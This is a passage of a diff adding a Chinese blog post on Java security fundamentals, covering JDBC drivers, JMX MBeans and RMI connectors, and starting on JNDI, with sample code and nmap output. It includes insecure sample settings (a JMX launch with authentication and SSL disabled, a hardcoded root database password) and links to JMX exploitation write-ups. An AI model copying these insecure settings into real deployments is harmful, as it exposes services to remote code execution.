+</span><span class="c1"></span>     <span class="n">Connection</span> <span class="n">conn</span> <span class="o">=</span> <span class="n">DriverManager</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span>
+       <span class="s">&#34;jdbc:mysql://localhost:3306/mydb?useSSL=false&#34;</span><span class="o">,</span> <span class="s">&#34;root&#34;</span><span class="o">,</span> <span class="s">&#34;rxhtemp&#34;</span><span class="o">);</span>
+
+     <span class="c1">// 2. Creating a statement object to execute a query
+</span><span class="c1"></span>     <span class="n">Statement</span> <span class="n">stmt</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">createStatement</span><span class="o">();</span>
+
+     <span class="c1">// 3. Executing the query and getting the ResultSet
+</span><span class="c1"></span>     <span class="n">ResultSet</span> <span class="n">rs</span> <span class="o">=</span> <span class="n">stmt</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">(</span><span class="s">&#34;SELECT * FROM user&#34;</span><span class="o">);</span>
+
+     <span class="c1">// 4. Processing the ResultSet
+</span><span class="c1"></span>     <span class="k">while</span> <span class="o">(</span><span class="n">rs</span><span class="o">.</span><span class="na">next</span><span class="o">())</span> <span class="o">{</span>
+       <span class="kt">int</span> <span class="n">id</span> <span class="o">=</span> <span class="n">rs</span><span class="o">.</span><span class="na">getInt</span><span class="o">(</span><span class="s">&#34;id&#34;</span><span class="o">);</span>
+       <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">rs</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">&#34;name&#34;</span><span class="o">);</span>
+       <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;ID: &#34;</span> <span class="o">+</span> <span class="n">id</span> <span class="o">+</span> <span class="s">&#34;, Name: &#34;</span> <span class="o">+</span> <span class="n">name</span><span class="o">);</span>
+     <span class="o">}</span>
+
+     <span class="c1">// 5. Closing the database resources
+</span><span class="c1"></span>     <span class="n">rs</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+     <span class="n">stmt</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+     <span class="n">conn</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+   <span class="o">}</span>
+ <span class="o">}</span>
+
+</code></pre></div><p><code>Class.forName</code> 显式导入驱动的方式在新版本已经不需要了，不过这个方式有利于让开发者理解 JDBC 使用的具体数据库驱动，一些例子如下:</p>
+<ul>
+<li>PostgreSQL : org.postgresql.Driver</li>
+<li>Oracle : oracle.jdbc.driver.OracleDriver</li>
+<li>Microsoft SQL Server : com.microsoft.sqlserver.jdbc.SQLServerDriver</li>
+<li>SQLite : org.sqlite.JDBC</li>
+<li>H2 : org.h2.Driver</li>
+<li>Apache Derby : org.apache.derby.jdbc.ClientDriver</li>
+<li>MariaDB : org.mariadb.jdbc.Driver</li>
+<li>IBM DB2 : com.ibm.db2.jcc.DB2Driver</li>
+<li>Informix : com.informix.jdbc.IfxDriver</li>
+</ul>
+<p>如果想实现自己的驱动，需要实现 <code>java.sql.Driver</code> 接口，其中一些关键方法有 <code>connect</code>、<code>acceptsURL</code> 等。connect 方法中会接受到传入的 URL 以及相关属性(如账号、密码)。</p>
+<p>实际上 DriverManager 查询驱动的方式也很简单，即通过循环遍历已注册的驱动 <code>registeredDrivers</code>，然后逐个调用其 <code>driver.connect</code> 方法，如果发现不为空就返回。<code>registeredDrivers</code> 是个列表结构，因此先添加的驱动会优先执行。</p>
+<p>另外如果驱动中实现的有问题，且攻击者可以污染传入的 URL 或者 Property，也有可能间接造成代码执行，关于这类攻击可以参考 <a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf" target="_blank" rel="noopener noreffer ">New Exploit Technique In Java Deserialization Attack</a>。”</p>
+<p>这段话中提到的 <a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf" target="_blank" rel="noopener noreffer ">New Exploit Technique In Java Deserialization Attack</a> 是一个关于 Java 反序列化攻击的研究，提供了关于这类攻击的详细信息。</p>
+<h2 id="jmx">JMX</h2>
+<p>“JMX 全称为 Java Management Extensions，即 Java 管理拓展，主要用于管理和监控 Java 程序。常见的监控资源有 CPU 占用率、线程数、JVM 内存等。下面是一些相关标准的定义:</p>
+<ul>
+<li><a href="https://www.jcp.org/en/jsr/detail?id=3" target="_blank" rel="noopener noreffer ">JSR 3: Java Management Extensions (JMX) Specification</a>，包含 JMX 1.0/1.1/1.2 的标准；</li>
+<li><a href="https://www.jcp.org/en/jsr/detail?id=160" target="_blank" rel="noopener noreffer ">JSR 160: Java Management Extensions (JMX) Remote API</a>；</li>
+<li><a href="https://www.jcp.org/en/jsr/detail?id=262" target="_blank" rel="noopener noreffer ">JSR 262: Web Services Connector for Java Management Extensions (JMX) Agents</a>；</li>
+</ul>
+<p>我们常用的 JConsole、VisualVM，以及现在流行的 Spring Boot 框架中的 Spring Boot Actuator 内部都使用了 JMX 拓展，因此对其进行了解有助于我们更好地认识这些应用和框架。”</p>
+<p>JMX（Java Management Extensions）是一种 Java 技术，用于监控和管理 Java 应用程序、设备、系统对象和服务。JMX 主要提供了一种标准化的方式来访问、监控和管理 Java 应用程序的运行时状态，包括 Java 虚拟机（JVM）内部的资源使用情况、性能指标和其他系统属性。通过 JMX，开发人员可以为 Java 应用程序提供诊断、性能调优和运维管理等功能。</p>
+<p>总之，JMX 技术为 Java 应用程序的监控和管理提供了一种灵活、可扩展的解决方案。通过 JMX，开发人员可以更容易地获取应用程序的运行时信息，进行性能分析和故障排查，从而提高系统的可靠性和稳定性。</p>
+<p>JMX 的工作原理可以简要概括为以下几个步骤：</p>
+<ol>
+<li>在 Java 应用程序中，开发人员定义了一系列 MBean（Managed Bean），这些 MBean 封装了应用程序的管理接口，包括属性和操作。</li>
+<li>应用程序中的 JMX Agent 创建并运行 MBean Server，用于存储和管理 MBean。</li>
+<li>将 MBean 注册到 MBean Server 中，使其可供监控和管理。</li>
+<li>JMX Agent 使用适配器和连接器（如 RMI、SNMP 等）与外部管理系统进行通信。</li>
+<li>远程客户端（例如 JConsole 或 VisualVM）通过 JMX Connector 连接到 JMX Agent。</li>
+<li>客户端通过远程访问 MBean Server 中的 MBean，获取管理属性和执行操作。</li>
+</ol>
+<p>示意图如下：</p>
+<pre><code> +----------------+       +-------------+       +--------------+
+ |Java Application|       | JMX Agent   |       | JMX Client   |
+ |                |       |             |       |              |
+ | +--------------+       | +---------+ |       | +----------+ |
+ | | MBean        |&lt;-----&gt;| |MBean    | |&lt;-----&gt;| | JMX      | |
+ | |(Managed Bean)|       | |Server   | |       | |Connector | |
+ | +--------------+       | +---------+ |       | +----------+ |
+ +----------------+       +-------------+       +--------------+
+</code></pre><p>在这个示意图中，Java 应用程序中定义了 MBean，这些 MBean 被注册到 JMX Agent 的 MBean Server 中。JMX Client 通过 JMX Connector 连接到 JMX Agent，从而可以访问和操作 MBean Server 中的 MBean。这样，开发人员和运维人员可以通过 JMX 客户端远程监控和管理 Java 应用程序。</p>
+<h3 id="组件">组件</h3>
+<p>“JMX 主要包括几个关键组件，下面分别进行介绍。</p>
+<ul>
+<li>
+<p><code>MBean</code>，全称是 Managed Bean，类似于 Java Bean，主要用来进行消息传递。与 Java Bean 的区别是 JMX 中对这些 Bean 进行了额外的定义，兼容 JMX 标准的 MBean 才可以被加载。在 <code>java.lang.management</code> 中定义了许多 JDK 提供的 MBean，包括 Memory、Thread 相关的 MBean，用于传递 JVM 应用的内存和线程相关信息。我们平时使用 <code>jconsole</code> 去分析 Java 应用时所展现的数据大多来源于这些 MBean。</p>
+</li>
+<li>
+<p><code>MBeanServer</code>，主要用于 MBean 的管理，同名接口定义在 <code>javax.management</code> 中，包含 MBean 创建、注册以及删除等操作相关的接口。一般用户不会直接实现该接口，而是通过 <code>MBeanServerFactory</code> 工厂类去获取 MBeanServer 实例。通常一个 Java 虚拟机中只会有一个 MBeanServer，只有注册到 MBeanServer 中的 MBean 才能被进行管理，即能够被连接到 MBeanServer 的客户端远程访问其属性和相关方法。</p>
+</li>
+<li>
+<p><code>Connector/Adaptor</code>，这是直接面对客户端的组件，负责具体协议的连接或者转换。在 JMX 标准中提到，RMI Connector 是在 JMX 标准实现中唯一强制实现的协议。RMI (Remove Method Invocation) 是 Java 中的远程调用接口，其具体的传输协议可以不同，常见有以下两种:</p>
+<ol>
+<li><strong>JRMP</strong> (Java Remote Method Protocol)，这是 RMI 的默认传输协议，专为 Java 而开发，因此性能较好；</li>
+<li><strong>IIOP</strong> (Internet Inter-ORB Protocol)，CORBA 标准的一部分，依赖于 CORBA 类库，因此可以实现多语言传输 RMI 远程对象，更适用于跨平台开发；</li>
+</ol>
+<p>除了 RMI Connector，JMX 中还定义了 Generic Connector 即通用连接器的标准。基于上文 JSR 160 提到的 JMX Remote API 来实现可配置和可插拔的连接器，包括传输协议和对象封装等接口。<code>JMXMP</code>，即 JMX Remote API over Message Service Protocol，就是一种通用连接器实现。客户端和服务器之间通过消息进行通信，消息可以是纯文本或二进制格式。JMXMP 支持基于 SSL/TLS 对连接进行加密，同时还有连接池、心跳等功能。</p>
+</li>
+<li>
+<p><code>Adaptor</code> 称为适配器，和连接器类似，主要将客户端对服务器中 MBean 的操作适配为其他协议，比如 SNMP 或者 HTTP 等。例如，<a href="https://jolokia.org/reference/html/index.html" target="_blank" rel="noopener noreffer ">Jolokia</a> 就是一个常用的开源 JMX-HTTP 适配器，可以使远程的 JMX 客户端通过 HTTP/HTTPS 协议访问 JMX MBean。”</p>
+</li>
+</ul>
+<h3 id="示例">示例</h3>
+<pre><code> +----------------+       +-------------+       +--------------+
+ |Java Application|       | JMX Agent   |       | JMX Client   |
+ |                |       |             |       |              |
+ | +--------------+       | +---------+ |       | +----------+ |
+ | | MBean        |&lt;-----&gt;| |MBean    | |&lt;-----&gt;| | JMX      | |
+ | |(Managed Bean)|       | |Server   | |       | |Connector | |
+ | +--------------+       | +---------+ |       | +----------+ |
+ +----------------+       +-------------+       +--------------+
+</code></pre><p>“假设我们是某个服务端应用，需要对外暴露一些监控信息，这种情况下就可以自定义一个 MBean 实现。JMX 要求 MBean 首先需要是一个接口，且接口名字以 <code>MBean</code> 结尾，例如:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">interface</span> <span class="nc">DemoMBean</span> <span class="o">{</span>
+    <span class="n">String</span> <span class="nf">getName</span><span class="o">();</span>
+    <span class="n">String</span> <span class="nf">getPassword</span><span class="o">();</span>
+    <span class="kt">void</span> <span class="nf">say</span><span class="o">(</span><span class="n">String</span> <span class="n">what</span><span class="o">);</span>
+<span class="o">}</span>
+</code></pre></div><p>一个具体的 MBean 需要实现上述接口:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">class</span> <span class="nc">Demo</span> <span class="kd">implements</span> <span class="n">DemoMBean</span> <span class="o">{</span>
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">getName</span><span class="o">()</span> <span class="o">{</span> <span class="k">return</span> <span class="s">&#34;evilpan&#34;</span><span class="o">;</span> <span class="o">}</span>
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">getPassword</span><span class="o">()</span> <span class="o">{</span> <span class="k">return</span> <span class="s">&#34;jmxdemo&#34;</span><span class="o">;</span> <span class="o">}</span>
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">say</span><span class="o">(</span><span class="n">String</span> <span class="n">what</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">getName</span><span class="o">()</span> <span class="o">+</span> <span class="s">&#34; say: &#34;</span> <span class="o">+</span> <span class="n">what</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>为了能够被客户端访问，需要将该 MBean 的实例注册到 <code>MBeanServer</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="n">MBeanServer</span> <span class="n">server</span> <span class="o">=</span> <span class="n">ManagementFactory</span><span class="o">.</span><span class="na">getPlatformMBeanServer</span><span class="o">();</span>
+<span class="n">ObjectName</span> <span class="n">userName</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectName</span><span class="o">(</span><span class="s">&#34;com.evilpan:type=Foo,name=bar&#34;</span><span class="o">);</span>
+<span class="n">server</span><span class="o">.</span><span class="na">registerMBean</span><span class="o">(</span><span class="k">new</span> <span class="n">Demo</span><span class="o">(),</span> <span class="n">userName</span><span class="o">);</span>
+</code></pre></div><p>其中 <code>userName</code> 是在 JMX MBean 中显示的名称，上述示例在 <code>jconsole</code> 的 MBeans 中查看有以下结构:</p>
+<pre><code> com.evilpan
+ └─ Foo
+    └─ bar
+       ├─ Attributes
+       │  ├─ Password
+       │  └─ Name
+       └─ Operations
+          └─ say
+
+</code></pre><p>点击 <code>Attributes</code> 中的 <code>Name</code> 和 <code>Password</code> 会调用对应的 <code>getName</code> 和 <code>getPassword</code> 方法来获取信息，而点击 <code>say</code> 可以调用对应 MBean 实例的方法，并指定相关参数。</p>
+<p>这里是使用 <code>jconsole</code> attach 本地应用的方式连接 MBeanServer 的，实际应用中可以通过 RMI 协议去让客户端进行远程管理，关键代码如下:”</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="n">MBeanServer</span> <span class="n">server</span> <span class="o">=</span> <span class="n">ManagementFactory</span><span class="o">.</span><span class="na">getPlatformMBeanServer</span><span class="o">();</span>
+<span class="c1">// Register MBean ...
+</span><span class="c1"></span><span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="n">7890</span><span class="o">);</span>
+<span class="n">JMXServiceURL</span> <span class="n">url</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JMXServiceURL</span><span class="o">(</span><span class="s">&#34;service:jmx:rmi:///jndi/rmi://localhost:7890/jmxrmi&#34;</span><span class="o">);</span>
+<span class="n">JMXConnectorServer</span> <span class="n">jcs</span> <span class="o">=</span> <span class="n">JMXConnectorServerFactory</span><span class="o">.</span><span class="na">newJMXConnectorServer</span><span class="o">(</span><span class="n">url</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">server</span><span class="o">);</span>
+<span class="n">jcs</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
+</code></pre></div><p>这段代码是用于创建并启动一个 JMX（Java Management Extensions）服务的示例。以下是代码段的详细解释：</p>
+<ol>
+<li>
+<p><code>MBeanServer server = ManagementFactory.getPlatformMBeanServer();</code></p>
+<p>这行代码通过调用 <code>ManagementFactory.getPlatformMBeanServer()</code> 方法获取平台 MBean 服务器的实例。MBean 服务器是 JMX 架构中的核心组件，它用于存储和管理 MBean（Managed Bean）。</p>
+</li>
+<li>
+<p><code>// Register MBean ...</code></p>
+<p>这是一个占位符，表示在此处注册 MBean。实际上，您需要创建一个或多个 MBean，并使用 <code>MBeanServer.registerMBean()</code> 方法将它们注册到 MBean 服务器。</p>
+</li>
+<li>
+<p><code>LocateRegistry.createRegistry(7890);</code></p>
+<p>这行代码创建了一个 RMI（Remote Method Invocation）注册表，用于在给定的端口（这里是端口 <code>7890</code>）上接收远程对象引用。RMI 是一种通信协议，允许在同一 JVM（Java Virtual Machine）内的不同对象之间进行远程方法调用。</p>
+</li>
+<li>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="n">JMXServiceURL</span> <span class="n">url</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JMXServiceURL</span><span class="o">(</span><span class="s">&#34;service:jmx:rmi:///jndi/rmi://localhost:7890/jmxrmi&#34;</span><span class="o">);</span>
+</code></pre></div><p>通过创建一个 <code>JMXServiceURL</code> 实例，指定 JMX 服务的 URL。这里使用 RMI 作为通信协议，URL 的格式为 <code>service:jmx:rmi:///jndi/rmi://localhost:7890/jmxrmi</code>，其中 <code>7890</code> 是 RMI 注册表的端口号。</p>
+</li>
+<li>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="n">JMXConnectorServer</span> <span class="n">jcs</span> <span class="o">=</span> <span class="n">JMXConnectorServerFactory</span><span class="o">.</span><span class="na">newJMXConnectorServer</span><span class="o">(</span><span class="n">url</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">server</span><span class="o">);</span>
+</code></pre></div><p>使用 <code>JMXConnectorServerFactory.newJMXConnectorServer()</code> 方法创建一个 <code>JMXConnectorServer</code> 实例。这个实例将允许 JMX 客户端通过指定的服务 URL 连接到 MBean 服务器。在这里，传入的参数包括：服务 URL（<code>url</code>）、环境属性（这里为 <code>null</code>，表示没有特定设置）和 MBean 服务器实例（<code>server</code>）。</p>
+</li>
+<li>
+<p><code>jcs.start();</code></p>
+<p>调用 <code>JMXConnectorServer.start()</code> 方法启动 JMX 连接器服务器。现在，JMX 客户端（如 JConsole 或 VisualVM）可以连接到此 JMX 服务并访问 MBean 服务器中的 MBean。</p>
+</li>
+</ol>
+<p>以下是一个简单的 JMX 客户端示例代码，该代码连接到上面启动的 JMX 服务并获取 MBean 的属性值。为了简化，我们假设已经注册了一个名为 <code>com.example:type=MyMBean</code> 的 MBean，并具有一个名为 <code>Value</code> 的属性。</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">javax.management.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.management.remote.*</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">JMXClient</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">// 创建 JMX 服务的连接
+</span><span class="c1"></span>            <span class="n">JMXServiceURL</span> <span class="n">url</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JMXServiceURL</span><span class="o">(</span><span class="s">&#34;service:jmx:rmi:///jndi/rmi://localhost:7890/jmxrmi&#34;</span><span class="o">);</span>
+            <span class="n">JMXConnector</span> <span class="n">jmxc</span> <span class="o">=</span> <span class="n">JMXConnectorFactory</span><span class="o">.</span><span class="na">connect</span><span class="o">(</span><span class="n">url</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+
+            <span class="c1">// 获取 MBean 服务器连接
+</span><span class="c1"></span>            <span class="n">MBeanServerConnection</span> <span class="n">mbsc</span> <span class="o">=</span> <span class="n">jmxc</span><span class="o">.</span><span class="na">getMBeanServerConnection</span><span class="o">();</span>
+
+            <span class="c1">// 构建 MBean 的 ObjectName
+</span><span class="c1"></span>            <span class="n">ObjectName</span> <span class="n">mbeanName</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectName</span><span class="o">(</span><span class="s">&#34;com.example:type=MyMBean&#34;</span><span class="o">);</span>
+
+            <span class="c1">// 获取 MBean 的属性值
+</span><span class="c1"></span>            <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">mbsc</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="n">mbeanName</span><span class="o">,</span> <span class="s">&#34;Value&#34;</span><span class="o">);</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Value of the MBean&#39;s attribute \&#34;Value\&#34;: &#34;</span> <span class="o">+</span> <span class="n">value</span><span class="o">);</span>
+
+            <span class="c1">// 关闭连接
+</span><span class="c1"></span>            <span class="n">jmxc</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="o">|</span> <span class="n">MalformedObjectNameException</span> <span class="o">|</span> <span class="n">AttributeNotFoundException</span> <span class="o">|</span>
+                <span class="n">InstanceNotFoundException</span> <span class="o">|</span> <span class="n">MBeanException</span> <span class="o">|</span> <span class="n">ReflectionException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>这个示例代码完成了以下任务：</p>
+<ol>
+<li>创建一个 <code>JMXServiceURL</code> 实例，用于指定要连接的 JMX 服务 URL。这里，我们使用与上述 JMX 服务相同的 URL。</li>
+<li>使用 <code>JMXConnectorFactory.connect()</code> 方法连接到指定的 JMX 服务。这将返回一个 <code>JMXConnector</code> 实例。</li>
+<li>通过调用 <code>JMXConnector.getMBeanServerConnection()</code> 方法获取一个 <code>MBeanServerConnection</code> 实例，用于与 MBean 服务器通信。</li>
+<li>使用 <code>ObjectName</code> 类创建一个对象，表示您要访问的 MBean。在这个例子中，我们使用的是 <code>com.example:type=MyMBean</code>。</li>
+<li>调用 <code>MBeanServerConnection.getAttribute()</code> 方法来获取 MBean 的属性值。这里，我们获取名为 <code>Value</code> 的属性。</li>
+<li>打印属性值。</li>
+<li>关闭 JMX 连接。</li>
+</ol>
+<p>在实际使用中，需要根据具体的 MBean 和关心的属性来修改代码。</p>
+<p>“当然，实际上 Java 本身也提供了内置的 JMX 连接器功能，可以通过命令行启动指定属性去开启，比如:</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">java -Dcom.sun.management.jmxremote.port<span class="o">=</span><span class="m">7890</span> <span class="se">\
+</span><span class="se"></span>  -Dcom.sun.management.jmxremote.authenticate<span class="o">=</span><span class="nb">false</span> <span class="se">\
+</span><span class="se"></span>  -Dcom.sun.management.jmxremote.ssl<span class="o">=</span><span class="nb">false</span> <span class="se">\
+</span><span class="se"></span>  -cp target/classes com.example.demo.BeanTest
+
+</code></pre></div><p>和上面自行添加 RMI 监听效果是一样的。 其中 RMI registry 的端口为 7890，<code>JMXServiceURL</code> 路径的结尾可以随意指定，但如果需要用 jconsole来进行连接，则必须使用 <code>/jmxrmi</code>。</p>
+<blockquote>
+<p>实际应用中更多使用 <code>-Dcom.sun.management.config.file</code> 指定 JMX 相关的配置</p>
+</blockquote>
+<p>应用启动后也可以通过 <code>nmap</code> 来查看对应端口信息:</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">$ nmap localhost -p 7890,56097 -sVC
+PORT     STATE SERVICE  VERSION
+7890/tcp open  java-rmi Java RMI
+<span class="p">|</span> rmi-dumpregistry:
+<span class="p">|</span>   jmxrmi
+<span class="p">|</span>     javax.management.remote.rmi.RMIServerImpl_Stub
+<span class="p">|</span>     @127.0.0.1:56097
+<span class="p">|</span>     extends
+<span class="p">|</span>       java.rmi.server.RemoteStub
+<span class="p">|</span>       extends
+<span class="p">|</span>_        java.rmi.server.RemoteObject
+56097/tcp open  java-rmi Java RMI
+
+</code></pre></div><p>“上面监听的 <code>56097</code> 端口是实际的 JMX-RMI Connector 监听端口，被注册为 <strong>RMI Nameing Registry</strong> 中的 <code>jmxrmi</code> 名称。</p>
+<p>这段 nmap 输出显示了针对本地主机（localhost）进行的端口扫描结果，扫描的端口为 7890 和 56097。扫描使用了 <code>-sVC</code> 选项，表示使用服务版本检测。以下是输出的解释：</p>
+<pre><code>PORT     STATE SERVICE  VERSION
+7890/tcp open  java-rmi Java RMI
+</code></pre><p>端口 7890 处于打开状态（open），运行的服务是 Java RMI（远程方法调用）。</p>
+<pre><code>| rmi-dumpregistry:
+|   jmxrmi
+|     javax.management.remote.rmi.RMIServerImpl_Stub
+|     @127.0.0.1:56097
+|     extends
+|       java.rmi.server.RemoteStub
+|       extends
+|_        java.rmi.server.RemoteObject
+</code></pre><p>这部分输出显示了 RMI 注册表的详细信息。在端口 7890 上找到了一个名为 <code>jmxrmi</code> 的 RMI 对象，它是 <code>javax.management.remote.rmi.RMIServerImpl_Stub</code> 类的实例。此 RMI 对象表示远程管理的 JMX（Java Management Extensions）服务。</p>
+<p>它使用 IP 地址 <code>127.0.0.1</code> 和端口 <code>56097</code> 进行通信。此外，<code>RMIServerImpl_Stub</code> 类继承了 <code>java.rmi.server.RemoteStub</code> 类，后者又继承了 <code>java.rmi.server.RemoteObject</code> 类。</p>
+<pre><code>56097/tcp open  java-rmi Java RMI
+</code></pre><p>端口 56097 处于打开状态（open），运行的服务也是 Java RMI（远程方法调用）。</p>
+<p>综上所述，这个 nmap 输出表明在本地主机上有一个打开的 JMX RMI 服务，它使用端口 7890 和 56097。这些信息对于了解本地主机上运行的服务、端口以及潜在的安全风险非常有用。</p>
+<p>从上面的介绍中可以看出，JMX 在 Java 应用管理和监控中的作用很大，但同时也暴露了很大的风险，如果服务端的 JMX 管理端口能被攻击者访问，就可能泄露敏感数据，或者被调用任意的 MBean 方法从而导致代码执行等危害。另外由于 RMI 是 JMX 默认的连接器，因此历史上也出现过许多针对 RMI 的攻击和反序列化漏洞，这里就先不展开了，其中相关的利用技巧和深入介绍可以参考下面的文章:</p>
+<ul>
+<li><a href="https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/" target="_blank" rel="noopener noreffer ">Attacking RMI based JMX services - @h0ng10</a></li>
+<li><a href="https://codewhitesec.blogspot.com/2023/03/jmx-exploitation-revisited.html" target="_blank" rel="noopener noreffer ">JMX Exploitation Revisited - Markus Wulftange</a></li>
+<li><a href="https://www.oracle.com/java/technologies/javase/management-extensions-best-practices.html" target="_blank" rel="noopener noreffer ">Java Management Extensions (JMX) Best Practices - Oracle</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Java_Management_Extensions" target="_blank" rel="noopener noreffer ">Java Management Extensions - Wikipedia</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/166530442">https://zhuanlan.zhihu.com/p/166530442</a></li>
+<li><a href="https://y4er.com/posts/from-jmx-to-rce/" target="_blank" rel="noopener noreffer ">梦游一次从jmx到rce - Y4er</a>”</li>
+</ul>
+<h2 id="后记">后记</h2>
+<p>“写到这里，可以说对 Java 安全有了一个比较基本的了解。Java 生态历经了几十年的发展，直到今天依旧在企业级服务端应用中占有半壁江山。从文中可以看到 Java 一直致力于提供高可用、可拓展的标准，有一些标准由于设计复杂接受度不高(如 EJB)，但也有很多标准从初稿到现在依然是主流(如 JNDI、JMX)。文中所介绍的几个功能应该算是 Java 初学者最先接触的技术，虽然只是冰山一角，但通过对这些技术的学习可以让我们管窥 Java EE 的全貌，也为后续针对性的研究打好基础。 ”</p>
+<p>JNDI的介绍可以阅读大佬的另一篇博客：<a href="https://evilpan.com/2021/12/13/jndi-injection/" target="_blank" rel="noopener noreffer ">JNDI 注入漏洞的前世今生 - evilpan</a></p>
+<p>在此再简单介绍一下，Java Naming and Directory Interface（JNDI）是 Java 平台的一部分，提供了一种用于查找和访问远程对象、服务和资源的统一接口。JNDI 将这些对象映射到一个命名系统，类似于文件系统或 DNS。JNDI 的主要用途是在分布式应用程序中解耦客户端和服务器组件，使它们可以在运行时轻松地查找和互相引用。</p>
+<p>以下是 JNDI 技术的一些示例用途：</p>
+<ol>
+<li><strong>查找远程对象</strong>：在分布式应用程序中，一个对象可能需要引用在另一个 JVM（Java 虚拟机）中运行的对象。JNDI 可以帮助查找这些远程对象，而无需硬编码它们的位置和引用。</li>
+<li><strong>查找数据源</strong>：在企业应用程序中，数据库连接通常由应用服务器管理。JNDI 可以帮助应用程序轻松查找这些数据源，而无需硬编码数据库连接信息。</li>
+<li><strong>查找 EJB（Enterprise JavaBeans）</strong>：在 Java EE 环境中，EJB 组件被部署到应用服务器中。客户端可以使用 JNDI 查找这些 EJB 组件并与之通信。</li>
+</ol>
+<p>以下是一个简单的 JNDI 示例，演示了如何在 Java 应用程序中查找和使用远程对象：</p>
+<ol>
+<li><strong>创建远程接口</strong>：首先，我们需要创建一个远程接口，它将定义我们要查找的远程对象的方法。这个接口必须扩展 <code>java.rmi.Remote</code> 接口。</li>
+</ol>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.rmi.Remote</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">interface</span> <span class="nc">MyRemoteService</span> <span class="kd">extends</span> <span class="n">Remote</span> <span class="o">{</span>
+    <span class="n">String</span> <span class="nf">sayHello</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></div><ol start="2">
+<li><strong>实现远程接口</strong>：接下来，我们需要实现这个远程接口，并将实现类扩展为 <code>java.rmi.server.UnicastRemoteObject</code>。</li>
+</ol>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.rmi.server.UnicastRemoteObject</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">MyRemoteServiceImpl</span> <span class="kd">extends</span> <span class="n">UnicastRemoteObject</span> <span class="kd">implements</span> <span class="n">MyRemoteService</span> <span class="o">{</span>
+    <span class="kd">protected</span> <span class="nf">MyRemoteServiceImpl</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
